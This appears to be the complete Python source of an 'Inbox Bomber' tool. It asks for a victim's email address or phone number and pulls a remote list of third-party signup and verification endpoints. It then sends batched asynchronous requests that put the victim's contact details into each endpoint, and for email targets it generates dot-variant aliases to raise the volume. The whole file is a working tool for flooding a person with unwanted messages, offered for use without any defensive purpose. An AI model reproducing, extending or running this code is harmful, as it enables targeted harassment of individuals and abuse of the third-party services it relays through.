import aiohttp, asyncio, time, fade, phonenumbers, re, json, os, logging, string
from colorama import Fore, Style
from pystyle import Center
from typing import List, Dict, Any, Optional
from phonenumbers import is_valid_number, format_number, PhoneNumberFormat
from tqdm import tqdm  # For the progress bar

TITLE = Center.XCenter(fade.water("""
▪   ▐ ▄ ▄▄▄▄·       ▐▄• ▄     ▄▄▄▄·       • ▌ ▄ ·. ▄▄▄▄· ▄▄▄ .▄▄▄  
██ •█▌▐█▐█ ▀█▪▪      █▌█▌▪    ▐█ ▀█▪▪     ·██ ▐███▪▐█ ▀█▪▀▄.▀·▀▄ █·
▐█·▐█▐▐▌▐█▀▀█▄ ▄█▀▄  ·██·     ▐█▀▀█▄ ▄█▀▄ ▐█ ▌▐▌▐█·▐█▀▀█▄▐▀▀▪▄▐▀▀▄ 
▐█▌██▐█▌██▄▪▐█▐█▌.▐▌▪▐█·█▌    ██▄▪▐█▐█▌.▐▌██ ██▌▐█▌██▄▪▐█▐█▄▄▌▐█•█▌
▀▀▀▀▀ █▪·▀▀▀▀  ▀█▄▀▪•▀▀ ▀▀    ·▀▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀·▀▀▀▀  ▀▀▀ .▀  ▀
"""))

def clear():
    if os.name == 'nt':  # For Windows
        os.system('cls')
    else:  # For macOS and Linux
        os.system('clear')
    print(TITLE)

DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"}
TIMEOUT = aiohttp.ClientTimeout(total=1)
SOURCE = "https://raw.githack.com/Inkthirsty/inbox-bomber/refs/heads/main/resources.json"
DEBUG = True  # Set this to False to disable debug prints

# Global variables for sent and errors
sent = 0
errors = 0

def identify(initial_input: str):
    initial_input = initial_input.strip()
    email_pattern = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
    if re.match(email_pattern, initial_input):
        return {"Type": "Email", "Email": initial_input.lower()}
    try:
        phone_number = phonenumbers.parse("+" + "".join([i for i in initial_input if i in string.digits]))
        if not is_valid_number(phone_number):
            return
        country_code = phone_number.country_code
        formatted_e164 = format_number(phone_number, PhoneNumberFormat.E164)  # +12025550173 | +447822031550
        formatted_international = format_number(phone_number, PhoneNumberFormat.INTERNATIONAL)  # +1 202-555-0173 | +44 7822 031550|
        formatted_national = format_number(phone_number, PhoneNumberFormat.NATIONAL)  # (202) 202-555-0173 | 078 2203 1550
        country = phonenumbers.region_code_for_number(phone_number)
        
        return {
            "Type": "Number",
            "Code": f"+{country_code}",
            "E.164": formatted_e164,
            "International": formatted_international,
            "National": formatted_national,
            "Country": country,
            "Formats": [formatted_e164, formatted_international, formatted_national, "".join([i for i in str(formatted_national) if i in string.digits]) ]
        }
    except phonenumbers.phonenumberutil.NumberParseException:
        return

def clamp(value, min_value, max_value):
    return max(min_value, min(value, max_value))

async def request(
    session: aiohttp.ClientSession, 
    url: str, 
    method: str = "POST", 
    json_: Optional[Dict[Any, Any]] = None, 
    data: Optional[Dict[Any, Any]] = None, 
    params: Optional[Dict[Any, Any]] = None, 
    headers: Optional[Dict[Any, Any]] = None,
    email: str = None,
    number: str = None,
    pbar: tqdm = None
):
    global sent, errors  # Make sent and errors global
    
    def gen(length: int = 5):
        ba = bytearray(os.urandom(length))
        for i, b in enumerate(ba):
            ba[i] = ord("a") + b % 26
        return str(time.time()).replace(".", "") + ba.decode("ascii")
    
    def fix(payload):
        replacements = {
            "{email}": email or f"{str(time.time())}@{gen()}.com",
            "{number}": number,
            "{username}": gen(),
            "{timestamp}": str(int(time.time()))
        }
        if payload is None:
            return None
        try:
            temp = json.dumps(payload) if isinstance(payload, dict) else str(payload)
            for k, v in replacements.items():
                if v is not None:
                    temp = temp.replace(k, v)
            return json.loads(temp) if isinstance(payload, dict) else temp
        except Exception:
            return str(payload)

    try:
        async with session.request(method=(method or "POST").upper(), url=fix(url), json=fix(json_), data=fix(data), params=fix(params), headers=headers or DEFAULT_HEADERS) as resp:
            resp.raise_for_status()  # Will raise an exception for 4xx or 5xx responses
            sent += 1  # Increment sent counter if the request succeeds
            if DEBUG:
                logging.info(f"Request to {fix(url).split('/')[2]} succeeded with status {resp.status}")
                logging.debug(f"Response: {await resp.text()}")
            if pbar:
                pbar.update(1)  # Update progress bar for each successful request
            return True
    except Exception as e:
        errors += 1  # Increment errors counter if an exception occurs
        if DEBUG:
            logging.error(e)
        if pbar:
            pbar.update(1)  # Update progress bar for each failed request
        return False

async def main():
    global sent, errors  # Make sent and errors global
    
    logging.basicConfig(
        level=logging.DEBUG,
        format=f"{Fore.RED}%(levelname)s:{Fore.RESET} %(message)s"
    )
    
    while True:
        # Reset sent and errors at the start of each loop
        sent = 0
        errors = 0
        
        while True:
            clear()
            print(f"Examples: {Fore.BLUE}hello@example.com{Fore.RESET} | {Fore.BLUE}+1 (202) 555-0173{Fore.RESET} | {Fore.BLUE}+44 20 7946 0958{Fore.RESET} | {Fore.BLUE}+12025550173{Fore.RESET}")
            print("Input an email address or phone number")
            INPUT = input("> ")
            PROCESSED = identify(INPUT)
            if PROCESSED:
                break
            logging.warning("Invalid email or phone number")
            await asyncio.sleep(2)
        
        async with aiohttp.ClientSession(headers=DEFAULT_HEADERS, timeout=TIMEOUT) as session:
            TYPE = PROCESSED.get("Type")
            logging.info(f"Identified Type: {Fore.YELLOW}{TYPE}{Fore.RESET}")
            if TYPE == "Number":
                async with session.get("https://country.io/names.json") as resp:
                    countries = await resp.json()
                print(f"Country: {Fore.YELLOW}{countries.get(PROCESSED.get('Country'))} ({PROCESSED.get('Code')}){Fore.RESET}")
                THREADS = 1
            else:
                f = lambda s:s[11:]and[s[0]+w+x for x in f(s[1:])for w in('.','')]or[s]
                COMBOS = f(PROCESSED.get("Email"))
                LIMIT = clamp(len(COMBOS), 1, 1_000)
                print(f"How many emails per request? 1-{LIMIT}")
                try:
                    THREADS = clamp(int(input("> ")), 1, LIMIT)
                except Exception:
                    THREADS = LIMIT
            print(f"Threads: {Fore.YELLOW}{THREADS:,}{Fore.RESET}")
            async with session.get(SOURCE) as resp:
                resp_json = json.loads(await resp.text())
                logging.info(f"Fetched data from {SOURCE}")
                batch_size = 200
                selection = [i for i in resp_json if i.get(TYPE.lower()) is not None and i.get(TYPE.lower()) is not False]
                if TYPE == "Number":
                    functions = [
                        (session, 
                        i.get("url"), 
                        i.get("method"), 
                        i.get("json"), 
                        i.get("data"), 
                        i.get("params"), 
                        i.get("headers"), 
                        None, 
                        PROCESSED.get("Formats")[i.get("number") - 1]
                        ) for i in selection]
                elif TYPE == "Email":
                    functions = [(session, i.get("url"), i.get("method"), i.get("json"), i.get("data"), i.get("params"), i.get("headers"), email, None) for email in COMBOS[:THREADS] for i in selection]

                # Using tqdm for the progress bar with a nicer look
                with tqdm(total=len(functions), desc="Processing tasks", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed} elapsed]") as pbar:
                    for i in range(0, len(functions), batch_size):
                        batch = functions[i:i+batch_size]
                        tasks = [asyncio.create_task(request(*data, pbar=pbar)) for data in batch]
                        await asyncio.gather(*tasks)
                        await asyncio.sleep(0)

        print("Press enter to continue")
        input("> ")
        await asyncio.sleep(0)

if __name__ == "__main__":
    asyncio.run(main())
